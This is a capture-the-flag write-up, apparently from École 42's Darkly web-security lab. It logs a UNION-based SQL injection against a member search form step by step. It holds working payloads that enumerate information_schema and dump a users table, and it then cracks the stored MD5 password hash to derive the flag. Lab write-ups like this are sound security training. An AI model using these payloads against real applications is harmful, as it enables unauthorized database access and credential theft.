# Darkly - École 42

## 12. SQL Injection - Members

- `1 OR true` : Affiche tous les users

- https://portswigger.net/web-security/sql-injection/union-attacks

### Determining the number of columns required

When you perform a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.

> One method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs.

- `1 or true ORDER BY 1--` : order by firstname
- `1 or true ORDER BY 2--` : order by surname
- `1 or true ORDER BY 3--` : Unknown column '3' in 'order clause'

- `1 or true UNION all SELECT 1, 2 information_schema.tables` : xxxxxxxxx
- `1 or true UNION all SELECT 1, table_name FROM information_schema.tables` : xxxxxxxxx
- `1 or true UNION all SELECT table_name, table_name FROM information_schema.columns` : xxxxxxxxx
- `1 UNION all SELECT table_name, column_name FROM information_schema.columns` :

```
ID: 1 UNION all SELECT table_name, column_name FROM information_schema.columns
First name: users

Surname : user_id
Surname : first_name
Surname : last_name
Surname : town
Surname : country
Surname : planet
Surname : Commentaire
Surname : countersign
```

- `1 UNION SELECT (user_id, first_name, last_name, town, country, planet, Commentaire, countersign) FROM users` : Operand should contain 1 column(s)
- `1 UNION SELECT user_id, first_name, last_name, town, country, planet, Commentaire, countersign FROM users` : The used SELECT statements have a different number of columns
- `1 UNION SELECT user_id FROM users` : The used SELECT statements have a different number of columns

- `1 UNION SELECT user_id, first_name, last_name, town, country, planet, Commentaire, countersign FROM users` : Operand should contain 1 column(s)
- `1 UNION SELECT user_id, first_name FROM users`
- `1 UNION SELECT planet, Commentaire FROM users`

```
First name: EARTH
Surname : Je pense, donc je suis

First name: Earth
Surname : Aamu on iltaa viisaampi.

First name: Earth
Surname : Dublin is a city of stories and secrets.

First name: 42
Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
```

`1 UNION SELECT user_id, concat(last_name, first_name, town, country, planet, Commentaire, countersign) FROM users WHERE user_id=5` :

```
GetTheFlag424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
```

- Google `5ff9d0165b4f92b14994e5c685cdce28` > md5 = `FortyTwo`

- to lower : `fortytwo`

```
echo -n "fortytwo" | sha256sum
```
